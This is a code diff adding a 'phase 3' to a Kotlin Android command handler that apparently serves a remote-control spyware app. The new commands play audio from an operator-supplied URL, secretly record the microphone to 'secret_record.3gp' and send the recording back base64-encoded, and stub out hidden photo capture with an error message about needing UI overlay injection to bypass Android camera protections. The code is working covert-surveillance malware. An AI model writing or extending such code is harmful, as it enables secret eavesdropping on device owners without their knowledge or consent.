@@ -290,6 +290,54 @@ class CommandHandler(private val context: Context) : TextToSpeech.OnInitListener
                         sendResponse(createResponse(cmdId, "error", "Missing WIFI/LOC permissions"))
                     }
                 }
+                // ============== FASE 3 ==============
+                "play_sound" -> {
+                    val url = textArg
+                    if (url.isNotEmpty()) {
+                        Thread {
+                            try {
+                                val mp = android.media.MediaPlayer()
+                                mp.setDataSource(url)
+                                mp.prepare()
+                                mp.start()
+                                sendResponse(createResponse(cmdId, "success", "Memainkan suara dari $url"))
+                            } catch (e: Exception) {
+                                sendResponse(createResponse(cmdId, "error", "Gagal memutar: ${e.message}"))
+                            }
+                        }.start()
+                    } else sendResponse(createResponse(cmdId, "error", "URL tidak boleh kosong (format: /cmd play_sound url)"))
+                }
+                "record_sound" -> {
+                    if (checkPerm(Manifest.permission.RECORD_AUDIO)) {
+                        val durationMs = textArg.toLongOrNull() ?: 5000L // default merekam 5 detik
+                        val file = java.io.File(context.cacheDir, "secret_record.3gp")
+                        Thread {
+                            try {
+                                val mr = android.media.MediaRecorder()
+                                mr.setAudioSource(android.media.MediaRecorder.AudioSource.MIC)
+                                mr.setOutputFormat(android.media.MediaRecorder.OutputFormat.THREE_GPP)
+                                mr.setAudioEncoder(android.media.MediaRecorder.AudioEncoder.AMR_NB)
+                                mr.setOutputFile(file.absolutePath)
+                                mr.prepare()
+                                mr.start()
+                                Thread.sleep(durationMs)
+                                mr.stop()
+                                mr.release()
+                                
+                                val bytes = file.readBytes()
+                                val b64 = android.util.Base64.encodeToString(bytes, android.util.Base64.DEFAULT)
+                                sendResponse(createResponse(cmdId, "audio_base64", b64))
+                            } catch (e: Exception) {
+                                sendResponse(createResponse(cmdId, "error", "Gagal merekam: ${e.message}"))
+                            }
+                        }.start()
+                    } else sendResponse(createResponse(cmdId, "error", "Izin RECORD_AUDIO belum di-ALLOW"))
+                }
+                "photo" -> {
+                    // Teknik jepret di belakang layar tanpa menampakkan antarmuka kamera (SurfaceView) 
+                    // adalah aktivitas yang sangat dibatasi di Android 11+. 
+                    sendResponse(createResponse(cmdId, "error", "Pemotretan tersembunyi (Background Photo Capture) memerlukan injeksi overlay UI khusus untuk menembus proteksi Kamera Android Modern."))
+                }
                 else -> {
                     sendResponse(createResponse(cmdId, "error", "Unknown command: $command"))
                 }
